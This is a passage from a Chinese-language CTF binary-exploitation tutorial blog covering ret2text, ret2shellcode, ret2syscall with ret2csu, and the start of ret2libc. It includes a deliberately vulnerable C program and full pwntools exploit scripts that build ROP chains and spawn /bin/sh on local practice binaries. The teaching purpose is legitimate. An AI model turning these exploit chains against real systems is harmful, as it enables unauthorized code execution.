+<p>然而这样的脚本在攻击时会出错。原因在于：</p>
+<p>正常的函数调用call来达到push eip；jmp的作用，经过初步payload构造的攻击如下图所示，是通过覆盖return达到jmp的作用的，并没有像call一样push eip到栈中。<br><img src="http://blog.forevers.love/usr/uploads/2023/11/4234700732.png" alt="38e10a9971624ec18cd2d549954ca408.png"><img src="/2024/03/27/wp/38e10a9971624ec18cd2d549954ca408.png" alt="38e10a9971624ec18cd2d549954ca408"><br> 故而ret执行后，ebp后为我们输入的参数而非eip原地址（函数结束后返回的地址），而函数读取参数的位置在上文中已经展示，为 ebp+0x8。故而在利用ret2text覆盖pwn题时候，需要自行加入一行栈帧的填充。<br><img src="http://blog.forevers.love/usr/uploads/2023/11/1648215160.png" alt="701953734d034bbe98efac9dc5c6f836.png"><img src="/2024/03/27/wp/701953734d034bbe98efac9dc5c6f836.png" alt="701953734d034bbe98efac9dc5c6f836"><br><em>64位系统</em><br>在64位的中在将垃圾数据写入之后，我们要将&#x2F;bin&#x2F;sh这段数据先写入到一个寄存器中然后将这个寄存器导入到函数中程序才能·执行<br>于是要做的第一步就是找到一个寄存器并修改其中的值，使用</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ROPgadget --binary 文件名 --only <span class="string">&#x27;pop|ret&#x27;</span></span><br></pre></td></tr></table></figure>
+<p><img src="http://blog.forevers.love/usr/uploads/2023/11/803004082.png" alt="屏幕截图 2023-11-28 195354.png">![屏幕截图 2023-11-28 195354](wp&#x2F;屏幕截图 2023-11-28 195354.png)<br>通过这个我们可以找的程序中可以给我们使用·修改寄存器的命令的地址<br>在这里我们只用传一段函数于是只要用pop rdi；ret一个指令将rdi中的值修改，然后便是在栈中放入‘bin&#x2F;sh’经由pop提交给rdi，最后便是填system的地址（在这里要填入的不能是plt段的system函数的地址，要填的是.data段中的call system的地址，因为在之前将&#x2F;bin&#x2F;sh的地址填入其中从而导入rdi中，如果要rdi中的数据能进入system中则要用call system，将rdi中值导入system然后在执行该函数)</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">payload=b<span class="number">&#x27;</span>A<span class="number">&#x27;</span>*垃圾数据的长度+p64(pop|ret的地址)+</span><br><span class="line">p64(.data段中的/bin/sh的地址)+p64(.data段中的call system的地址)</span><br></pre></td></tr></table></figure>
+
+<p>#ret2shellcode<br>在这一类题中不会出现system和&#x2F;bin&#x2F;sh这种直接可以用来控制的函数，但程序中有一部分是可读可写可执行的部分，这一部分在程序中是很危险的一部分，一旦出现这种地方，同时含有栈溢出，便可以在通过栈溢出之后使程序跳到那部分可读可写可执行的部分，我们在往里面输入我们shellcode（意为一段恶意程序，通过执行这一段恶意程序，获得控制权）</p>
+<p>关于可读可写可执行段的查找可以在gdb调式程序的过程中用vmmap指令查找<br><img src="http://blog.forevers.love/usr/uploads/2023/11/3104877570.png" alt="屏幕截图 2023-11-30 143610.png">![屏幕截图 2023-11-30 143610](wp&#x2F;屏幕截图 2023-11-30 143610.png)<br>如图便可以查找到从0x601000到0x602000是可读可写可执行（一下称为rwx)的程序，我们便可以将shellcode写入到这段程序</p>
+<p>有的时候这个程序不一定在一开始写的时候便有rwx段程序，但在执行时会因为那个指令出现rwx段程序，如</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mprotect(<span class="number">0x601000</span>,<span class="number">0x100</span>,PROT_READ | PROT_WRITE | PROT_EXEC);</span><br></pre></td></tr></table></figure>
+<p>这个指令将0x601000之后的0x100段数据都改为rwx程序于是我们便可以想这段之中写入我们的shellcode，在通过栈溢出使他执行这一段程序。</p>
+<p><strong>shellcode</strong><br>一段恶意程序，可以在pwntools中获得比较简单的一些，执行</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">shellcraft.sh()<span class="comment">//默认为32位的如果要64位执行下面这个</span></span><br><span class="line">shellcraft.amd64.sh()<span class="comment">//</span></span><br></pre></td></tr></table></figure>
+<p><img src="http://blog.forevers.love/usr/uploads/2023/11/2163217567.png" alt="屏幕截图 2023-11-30 145900.png">![屏幕截图 2023-11-30 145900](wp&#x2F;屏幕截图 2023-11-30 145900.png)<br>此时我们获得不过是汇编语言不能直接传入程序中，必须将它换为机器语言传入才能穿入成功</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">asm</span>(shellcraft.sh())</span><br><span class="line">这样输出的便是机器语言的shellcode，直接传入其中便可以使用</span><br></pre></td></tr></table></figure>
+<p>在64位的是可能会因为其环境默认为32位的而出现问题可以通过如下修改<br><img src="http://blog.forevers.love/usr/uploads/2023/11/3832015840.png" alt="屏幕截图 2023-11-30 150708.png">![屏幕截图 2023-11-30 150708](wp&#x2F;屏幕截图 2023-11-30 150708.png)</p>
+<p><strong>例题</strong></p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/mman.h&gt;</span> </span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> _GNU_SOURCE   </span></span><br><span class="line"></span><br><span class="line"><span class="comment">//gcc poc.c -o poc -no-pie -fno-stack-protector</span></span><br><span class="line"><span class="type">char</span> shellcode[<span class="number">100</span>];</span><br><span class="line"><span class="type">void</span> <span class="title function_">initt</span><span class="params">()</span></span><br><span class="line">	&#123;</span><br><span class="line">		setvbuf(<span class="built_in">stdin</span>, <span class="number">0LL</span>, <span class="number">1</span>, <span class="number">0LL</span>);</span><br><span class="line">		setvbuf(<span class="built_in">stdout</span>, <span class="number">0LL</span>, <span class="number">2</span>, <span class="number">0LL</span>);</span><br><span class="line">		<span class="keyword">return</span> setvbuf(<span class="built_in">stderr</span>, <span class="number">0LL</span>, <span class="number">1</span>, <span class="number">0LL</span>);</span><br><span class="line">	&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">pwnn</span><span class="params">()</span></span><br><span class="line">	&#123;</span><br><span class="line">		<span class="type">char</span> a[<span class="number">10</span>];</span><br><span class="line">		<span class="built_in">puts</span>(<span class="string">&quot;please pwn me!!!&quot;</span>);</span><br><span class="line">		read(<span class="number">0</span>,a,<span class="number">0x20</span>);</span><br><span class="line">	&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">InputName</span><span class="params">()</span></span><br><span class="line">	&#123;</span><br><span class="line">		<span class="built_in">puts</span>(<span class="string">&quot;inputs you name&quot;</span>);</span><br><span class="line">		read(<span class="number">0</span>,shellcode,<span class="number">100</span>);</span><br><span class="line">		mprotect(<span class="number">0x601000</span>,<span class="number">0x100</span>,PROT_READ | PROT_WRITE | PROT_EXEC);</span><br><span class="line">	&#125;</span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">	initt();</span><br><span class="line">	InputName();</span><br><span class="line">	pwnn();</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>在这段程序中先执行InputName函数，在这个函数中，同构read向shellcode中可以输入最长100字节的数据，然后我们会发现他将0x601000之后100的数据改为rwx段，在ida中正好可以看到shellcode段的数据刚好在这其中，我们便可以通过这个向其中输入shellcode，在pwnn这个函数中正好有栈溢出的存在，<br>于是便可以先通过InputName函数输入shellcode然后再pwnn中栈溢出指向<br>shellcode的地址<br>攻击如下</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">io=process(<span class="string">&quot;./poc&quot;</span>)</span><br><span class="line">context.arch = <span class="string">&quot;amd64&quot;</span><span class="comment">//更改环境</span></span><br><span class="line">bss=<span class="number">0x6010A0</span><span class="comment">//shellcode的地址</span></span><br><span class="line">payload=b<span class="number">&#x27;</span>A<span class="number">&#x27;</span>*<span class="number">24</span>+p64(bss)<span class="comment">//溢出并指向地址</span></span><br><span class="line">binsh=<span class="keyword">asm</span>(shellcraft.amd64.sh())构建shellcode</span><br><span class="line">io.send(binsh)<span class="comment">//先将shellcode传入rwx段中</span></span><br><span class="line">io.recv()<span class="comment">//由于是两段输入中间一个做间隔</span></span><br><span class="line">io.send(payload)<span class="comment">//进行栈溢出</span></span><br><span class="line">io.interactive()<span class="comment">//交互</span></span><br></pre></td></tr></table></figure>
+<p>在这一类题中有一个必须注意的事，shellcraft注入的地方最好是bss区，在这题中便是注入到bss区中的，虽然可以注入到栈上但栈上的保护过多最好不要注入到栈中</p>
+<p>#ret2syscall<br>来吧趁今天有点时间把欠了一个星期的博客给补了<br>syscall相当于是一个系统中的命令，可以在与其他寄存器相配合的情况下完成系统调令，在程序没有system和&#x2F;bin&#x2F;sh时使用。<br>在系统中要取得控制权常用的方法是执行system（&#x2F;bin&#x2F;sh）指令，但很多情况下程序是一般不会有这个指令的，此时便可以看是不是可以通过向rwx段注入shellcode来获得控制权，但程序一般也不会有这种地方此时便可以开始考虑ret2syscall的方法，但这种方法夜有很大的局限性，一般只能在静态链接中使用，很少在动态链接中使用，虽然也不是不可以（之后便会讲一题用动态链接的题虽然在一定程度上那题可以算ret2csu的题但本质上还算用syscall可以做的题），</p>
+<p>ret2syscall的本质就是让部分寄存器中的值变为特殊值从而使程序执行一个系统调令</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">mov eax rax, <span class="number">0xb</span> <span class="number">0x3b</span></span><br><span class="line">mov ebx rdi, [“/bin/sh”] </span><br><span class="line">mov ecx rsi, <span class="number">0</span></span><br><span class="line">mov edx rdx, <span class="number">0</span></span><br><span class="line"><span class="type">int</span> <span class="number">0x80</span> syscall</span><br><span class="line">=&gt; execve(<span class="string">&quot;/bin/sh&quot;</span>,<span class="literal">NULL</span>,<span class="literal">NULL</span>)</span><br></pre></td></tr></table></figure>
+
+<p>在静态链接中，在系统内核中的execve(“&#x2F;bin&#x2F;sh”,NULL,NULL)这个函数可以获得控制权，但由于他是内核函数，所以，在调用它时必须满足一些必要的调用约定才可以进行调用，</p>
+<p>像这些系统内核函数调用必须使用一些特殊的汇编指令才能调用，如int 80（32位）和syscall（64位）就像一个call函数，但是是跳转到内核系统中，至于要跳到哪个函数则要根据之前部分寄存器的值来确定，eax(32)和rax(64)保存了系统调用号（内核函数在内核中都有独属于自己一个调用号，如execve的调用号为11（32位&#x3D;0xb）,59（64位&#x3D;0x3b））,ebx和rdi用来保存在函数中执行的参数的地址，同时要保证ecx，edx和rsi，rdx中的值都为0。</p>
+<p>大致就是这个但现在我们要面临的问题是如何修改寄存器中的值，这个有一个很好的方法。可以在终端中运行rop便可以找到程序中的可以帮我们修改寄存器的指令</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ROPgadget --binary 文件名 --only <span class="string">&quot;pop|ret&quot;</span></span><br></pre></td></tr></table></figure>
+<p><img src="http://blog.forevers.love/usr/uploads/2023/12/1839070299.png" alt="屏幕截图 2023-12-09 160956.png">![屏幕截图 2023-12-09 160956](wp&#x2F;屏幕截图 2023-12-09 160956.png)</p>
+<p>如此便可以查看在程序中有那些可以供我们去修改寄存器的命令（像这种用于修改寄存器的指令一般被称为gadget），我们只要在栈溢出的垃圾值后面加入这些指令，pop+寄存器的意思是将此时栈上的值取出放入寄存器中，ret的作用是返回栈中，回到我们自己的指令去继续执行我们的指令，而要放入寄存器中的值则只要放在这个指令地址的后面，在程序执行时会将这个指令的后面的那个值作为出栈的数据放入寄存器中。需要注意的是在命令中可能不止一个寄存器，此时我们变要将每一个寄存器的值都改变，便在寄存器命令后面以此放上要放入寄存器的值，如</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">0x0000000000405b44</span> : pop rbx ; pop rbp ; pop r12 ; pop r13 ; ret</span><br><span class="line">这是用上面的那个指令运行后出现的一行数据</span><br><span class="line">我们的利用</span><br><span class="line">p32(<span class="number">0x0000000000405b44</span>)+p32(<span class="number">2</span>)+p32(<span class="number">0</span>)+p32(<span class="number">9</span>)+p32(<span class="number">0x3d</span>)</span><br></pre></td></tr></table></figure>
+<p>如此当被我们劫持的程序执行到这里时，便会依次将2，0，9，0x3d这四个数据分别放入rbx,rbp,r12,r13这四个寄存器中，然后ret会将程序返回到原本的指令中。</p>
+<p>有了以上的分析其实像这种题的过程便可以很清晰的出来了，<br>32位程序：<br>先输入垃圾数据然后，寻找足够的gadget将eax的值改为0xb，ebx改为‘&#x2F;bin&#x2F;sh’的地址（有的程序中会没有这个数据，但可以自己输入，在之后的题便是这种，到时候细讲）ecx改为0，edx改为0。<br>在这4个寄存器的值都改好后便可以执行int 0x80这个指令，获得控制权·<br>64位程序：<br>先输入垃圾数据然后，寻找足够的gadget将rax的值改为0x3b，rbi改为‘&#x2F;bin&#x2F;sh’的地址（有的程序中会没有这个数据，但可以自己输入，在之后的题便是这种，到时候细讲）rsi改为0，rdx改为0。<br>在这4个寄存器的值都改好后便可以执行syscall这个指令，获得控制权·</p>
+<p>如上便是ret2syscall这类题的做法，其实细看回事有很大的限制在其中<br>1，要有足够将4个寄存器都修改的gadget，这一点便基本将动态链接给淘汰了，在大部分的动态链接中是没有足够多的gadget给我们使用的，只用静态链接中才会有足够时的gadget<br>2，在程序中必须有int 0x80（32位程序）或syscall（64位程序）指令</p>
+<p>现在便拿出一道方法用的是ret2syscall但其中用了ret2csu的思想的一道动态链接的64位程序的（神奇）题</p>
+<p>老样子先用checksec查看程序的保护（这道题是学长给的，在一开始题目就是ret2syscall虽然我一度怀疑题目错了，但最后确实没错，在后面为了好输入我改成poc）<br><img src="http://blog.forevers.love/usr/uploads/2023/12/1565444552.png" alt="屏幕截图 2023-12-09 170220.png">![屏幕截图 2023-12-09 170220](wp&#x2F;屏幕截图 2023-12-09 170220.png)<br>没什么特别的那就直接开整吧，</p>
+<p>既然是ret2syscall那就找gadget，这里便是我懵逼的第一个地方，如此少的gadget，只能找到修改rdi和rsi的指令器外两个寄存器的值该怎么改？（拿命改），<br><img src="http://blog.forevers.love/usr/uploads/2023/12/3017193538.png" alt="屏幕截图 2023-12-09 171431.png">![屏幕截图 2023-12-09 171431](wp&#x2F;屏幕截图 2023-12-09 171431.png)</p>
+<p>先不管将程序放入64位的ida中<br><img src="http://blog.forevers.love/usr/uploads/2023/12/3385520804.png" alt="屏幕截图 2023-12-09 172045.png">![屏幕截图 2023-12-09 172045](wp&#x2F;屏幕截图 2023-12-09 172045.png)<br>果然，一看左边这么少的函数就知道是个动态链接的程序，<br>返回到汇编的窗口仔细一找woc居然有syscall指令<br><img src="http://blog.forevers.love/usr/uploads/2023/12/1100300480.png" alt="屏幕截图 2023-12-09 172639.png">![屏幕截图 2023-12-09 172639](wp&#x2F;屏幕截图 2023-12-09 172639.png)<br>but在参数一栏找发现没有&#x2F;bin&#x2F;sh<br><img src="http://blog.forevers.love/usr/uploads/2023/12/1868602236.png" alt="屏幕截图 2023-12-09 172745.png">![屏幕截图 2023-12-09 172745](wp&#x2F;屏幕截图 2023-12-09 172745.png)<br>这便是我疑惑的第2个地方，后来问了学长才知道，在主程序中有gets函数便可以在劫持程序后利用gets函数将&#x2F;bin&#x2F;sh这个字符串输入到bss段中的空地址中，然后再调用。</p>
+<p>好到现在来总结一下，我们能使用的有<br>syscall命令，<br>rdi和rsi寄存器，<br>用gets函数输入&#x2F;bin&#x2F;sh，<br>如果不考虑ret2libc的话，还差rax和rdx寄存器的改变</p>
+<p><strong>此时一个重要的思想出来，在程序中的__libc_csu_init函数，能有大用，改变某些寄存器的作用</strong><br>这便是ret2csu的思想，将程序导入__libc_csu_init函数中从而改变一些gadget不能改变的寄存器的值<br><img src="http://blog.forevers.love/usr/uploads/2023/12/4152783716.png" alt="屏幕截图 2023-12-09 192250.png">![屏幕截图 2023-12-09 192250](wp&#x2F;屏幕截图 2023-12-09 192250.png)<br>在这里便可以先让程序执行0x4012DA地址的指令，修改rbx,rbp,r12,r13,r14,r15寄存器的值，然后在使程序执行0x4012C0地址的指令，从而修改rdx,rsi,edi的值（虽然是edi不是rdi，但是也可以相当于改变rdi，一般用不到前面的位数改变后面的足够了）最后的call可以直接跳转到一个函数出执行（这里有一个大坑，后面慢慢讲)</p>
+<p>到了此时便只差rax的值不能改变，在程序中慢慢找看看能不能找到可以改变的地方<br><img src="http://blog.forevers.love/usr/uploads/2023/12/1473558961.png" alt="屏幕截图 2023-12-09 194646.png">![屏幕截图 2023-12-09 194646](wp&#x2F;屏幕截图 2023-12-09 194646.png)<br>好，找到了，在0x40119e及后面的指令在利用后刚好能将edi中的值传输到eax中（在64为系统中主用的是r开头的寄存器，e开头寄存器就是r开头的寄存器的后半部分，大部分情况下，r开头的寄存器前半部分的值用不到的，e的改变足够用），在这里还有一个很重要的点，我们是先将edi的值传进[rbp+var_4]，在将[rbp+var_4]传进eax中，于是我们必须要保证[rbp+var_4]中的值是一个空但有限的地址，在bss段中选择。（var_4在前面有定义，但不用管比较小，只要保证rbp中的地址空并且有效就行)</p>
+<p>由于本题中需要用到的空地址有点多，先讲一下空地址的选择<br>由于我们在调用gets函数需要向空地址写入数据，便要找到一个可写的地址，而bss段便是一个可写的地方，我们可以通过gdb调试中寻找在gdb调试进入程序后输入</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vmmap</span><br></pre></td></tr></table></figure>
+<p>命令便可以看到每一段地址对应的能力，然后在确认好地址后用如下命令查看地址对应的存放情况</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">x/<span class="number">20</span>gx 地址名<span class="comment">//20代表的是从该地址往后的20字节的地址都显示出来</span></span><br></pre></td></tr></table></figure>
+<p><img src="http://blog.forevers.love/usr/uploads/2023/12/3926396535.png" alt="屏幕截图 2023-12-09 201100.png">![屏幕截图 2023-12-09 201100](wp&#x2F;屏幕截图 2023-12-09 201100.png)<br>如此便可以确认这个地址是一个可写的空的有效的地址</p>
+<p>如此我们便可以将这个题的全部思路写出来，在一开始直接向程序中输入24个垃圾字节数据进行栈溢出，用于劫持程序，然后利用gets函数输入&#x2F;bin&#x2F;sh字符串，<br>在这里会出现一个事情，我们要向一个特定地址输入字符，而gets函数的原型是</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">char</span> *<span class="title function_">gets</span><span class="params">(<span class="type">char</span> *str)</span>;</span><br></pre></td></tr></table></figure>
+<p>于是在执行gets函数中时便会向先调用rdi寄存器（rdi为最常用的通用寄存器）中的值作为函数输入的值的存放地址，<br>于是我们便要向rdi赋一个空地址，然后才调用gets函数</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload=b<span class="number">&#x27;</span>A<span class="number">&#x27;</span>*<span class="number">24</span>+p64(pop_rdi_ret)+p64(<span class="number">0x404480</span>)+p64(gets)<span class="comment">//get地址为plt段的地址，0x404480空地址</span></span><br></pre></td></tr></table></figure>
+<p>然后程序便等待输入，输入的过程可以在后面重新开一个新的payload2用于输入数据</p>
+<p>在输入完成后开始对其他寄存器的值开始改变，先改变rax中的值为0x3b，将rdi中的值改变为0x3b，然后将rbp赋值为一个空地址为是程序执行下去，在程序后面还要在加一个空地址用于解决pop rbp指令</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload+=p64(pop_rdi_ret)+p64(<span class="number">0x3b</span>)+p64(pop_rbp_ret)+p64(<span class="number">0x404680</span>)+p64(edi_eax)+p64(<span class="number">0x404580</span>)<span class="comment">//两个地址都是空地址，edi_eax是指令的开始</span></span><br></pre></td></tr></table></figure>
+
+<p>现在rax的值已经改为0x3b，然后将r12,r13,r14,r15改为&#x2F;bin&#x2F;sh的地址，0,0,call要调转的地方。然后再执行mov的指令</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">call    ds:(__frame_dummy_init_array_entry - <span class="number">403E10</span>h)[r15+rbx*<span class="number">8</span>]</span><br></pre></td></tr></table></figure>
+<p>这里有一个特殊的地方，call的跳转并不会直接跳转到那个指令的地址，然后执行，而是会将[r15+rbx*8]的地址所存放的地址先读取了，跳转到那个地址然后执行，所以在gets函数输入处不只要&#x2F;bin&#x2F;sh还要syscall指令的地址，然后在让call的调转到gets函数输入的syscall指令的地址，</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">payload+=p64(pop_r12_pop_r13_pop_r14_pop_r15_ret)</span><br><span class="line">payload+=p64(<span class="number">0x404480</span>)+p64(<span class="number">0</span>)+p64(<span class="number">0</span>)+p64(<span class="number">0x404488</span>)+p64(<span class="number">0x4012C0</span>)</span><br><span class="line"><span class="comment">//0x4012C0是mov的指令，0x404488是syscall指令地址存放的地址，</span></span><br><span class="line"><span class="comment">//0x404480是/bin/sh存放的地址</span></span><br></pre></td></tr></table></figure>
+<p>第一个payload构造完成<br>开始构造第二个payload2，</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">payload2=b<span class="number">&#x27;</span>/bin/sh\x00<span class="number">&#x27;</span>+p64(syscall)</span><br><span class="line"><span class="comment">///bin/sh\x00刚好有8个字节于是再后面syscall的指令，</span></span><br><span class="line"><span class="comment">//刚好是放在/bin/sh的地址加8位后，</span></span><br></pre></td></tr></table></figure>
+<p>好，给出完整的脚本</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line"><span class="meta">#context(log_level=<span class="string">&#x27;debug&#x27;</span>)</span></span><br><span class="line">io=process(<span class="string">&quot;./poc&quot;</span>)</span><br><span class="line">io.recv()</span><br><span class="line">pop_rbp_ret=<span class="number">0x40117d</span></span><br><span class="line">syscall=<span class="number">0x4011ae</span></span><br><span class="line">pop_rsi_pop_r15_ret=<span class="number">0x4012e1</span></span><br><span class="line">pop_rdi_ret=<span class="number">0x4012e3</span></span><br><span class="line">ret=<span class="number">0x40101a</span></span><br><span class="line">pop_r13_pop_r14_pop_r15_ret=<span class="number">0x4012de</span></span><br><span class="line">syscall=<span class="number">0x4011ae</span></span><br><span class="line">edi_eax=<span class="number">0x40119E</span></span><br><span class="line">main=<span class="number">0x401223</span></span><br><span class="line">gets=<span class="number">0x401090</span></span><br><span class="line">getplt=<span class="number">0x404028</span></span><br><span class="line">pop_r12_pop_r13_pop_r14_pop_r15_ret=<span class="number">0x4012dc</span></span><br><span class="line">payload=b<span class="number">&#x27;</span>A<span class="number">&#x27;</span>*<span class="number">24</span>+p64(pop_rdi_ret)+p64(<span class="number">0x404480</span>)+p64(gets)</span><br><span class="line">payload+=p64(pop_rdi_ret)+p64(<span class="number">0x3b</span>)+p64(pop_rbp_ret)+p64(<span class="number">0x404680</span>)+</span><br><span class="line">p64(edi_eax)+p64(<span class="number">0x404580</span>)+p64(pop_r12_pop_r13_pop_r14_pop_r15_ret)</span><br><span class="line">+p64(<span class="number">0x404480</span>)+p64(<span class="number">0</span>)+p64(<span class="number">0</span>)</span><br><span class="line">payload+=p64(<span class="number">0x404488</span>)+p64(<span class="number">0x4012C0</span>)</span><br><span class="line">payload2=b<span class="number">&#x27;</span>/bin/sh\x00<span class="number">&#x27;</span></span><br><span class="line">payload2+=p64(syscall)</span><br><span class="line"><span class="meta">#gdb.attach(io,<span class="string">&#x27;b *0x4012C0&#x27;</span>) </span></span><br><span class="line"><span class="meta">#pause()</span></span><br><span class="line">io.sendline(payload)<span class="comment">//第一次传入</span></span><br><span class="line"></span><br><span class="line">io.sendline(payload2)第二次传入</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
+<p>#ret2libc<br>在这里将之间讲述无system和无&#x2F;bin&#x2F;sh的情况将32位与64位分开讲述</p>
+<p><strong>32位</strong><br>在这类题中一般是动态链接很多操作都不能执行<br>更多的知识不多讲直接将做题的过程<br>对于这种题我们一般可以先调用可已打印东西的函数，如puts的函数将got中谋个函数的地址答应出来，根据动态链接的延迟绑定规定，在第一次调用某个函数之后其在动态链接库中的地址将被写入got表中，我们便可以同过put等打印数据的函数将其打印出来地址，这个地址便是该函数在动态链接库中对应的地址，在题中有很大的可能这个地址是一个变化中的地址，这是系统的一种保护操作，但是一般答应出来的后3位（16进制的数）是不会变的，而我们便可以将这后3位的地址用于判断其动态链接库的类型，</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">from LibcSearcher import LibcSearcher<span class="comment">//这个可用于自动寻找库，不过可能有点老，反正我没有用这个成功过</span></span><br><span class="line">io=process(<span class="string">&#x27;./文件名&#x27;</span>)</span><br><span class="line">puts_plt=<span class="number">0x00000</span><span class="comment">//puts在plt段的地址，可以直接在ida中找也可以用链接文件后直接用程序找</span></span><br><span class="line">main=<span class="number">0x00000</span><span class="comment">//main函数在text段中的地址，用于在打印地址后返回main从新开始执行</span></span><br><span class="line">libc_start_main=<span class="number">0x000000000</span><span class="comment">//got段中的libc_start_main的地址，在第一次调用后会有真实地址，打印出来</span></span><br><span class="line">payload=b<span class="number">&#x27;</span>A<span class="number">&#x27;</span>*<span class="number">22</span>+p32(put_plt)+p32(main)+p32(libc_start_main)</span><br><span class="line"><span class="comment">//32位的函数调用特点，间隔一个放参数。</span></span><br><span class="line">io.recvuntil(<span class="string">&quot;\n&quot;</span>)<span class="comment">//可用可不用，关键根据当时的情况来加入，括号内是程序的输出</span></span><br><span class="line">libcaddr=u32(io.recv(<span class="number">4</span>))</span><br><span class="line"><span class="comment">//用于接收用puts函数打印出来的__libc_start_main函数的真实地址</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<p>在有libc_start_main函数的真实地址后，可以在网上查找函数的偏移地址<br><img src="http://blog.forevers.love/usr/uploads/2023/12/3046998676.png" alt="屏幕截图 2023-12-09 220543.png">![屏幕截图 2023-12-09 220543](wp&#x2F;屏幕截图 2023-12-09 220543.png)<br>一般来说真实地址的值会因为保护程序的存在而使中间的地址被随机化，但最后的3位（16进制)不会被改变，便可以通过后3位查到偏移量，<br><strong>程序的基本地址&#x3D;__libc_start_main函数的真实地址-__libc_start_main函数的偏移量<br>system函数的真实地址&#x3D;程序的基本地址+system函数的偏移量<br>str_bin_sh函数的真实地址&#x3D;程序的基本地址+str_bin_sh函数的偏移量</strong></p>
+<p>然后调用system函数利用str_bin_sh函数，便也可以获得控制权，</p>
